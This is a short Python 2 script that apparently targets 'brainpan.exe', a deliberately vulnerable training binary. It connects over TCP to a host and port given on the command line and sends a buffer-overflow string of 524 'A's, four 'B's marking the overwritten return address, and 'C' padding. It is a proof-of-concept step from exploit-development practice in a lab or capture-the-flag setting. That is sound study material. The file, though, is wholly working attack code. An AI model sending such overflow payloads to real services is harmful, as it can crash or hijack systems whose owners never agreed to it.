#!/usr/bin/python
import time, struct, sys
import socket as so

buff = "A" * 524 + "B" * 4 + (900 - 524 - 4) * "C"

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print "\n[+] Attempting to send buffer overflow to brainpan.exe...."
try:   
   s.connect((server,port))
   s.send(buff + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to brainpan.exe. Check your IP address and port"
   sys.exit()
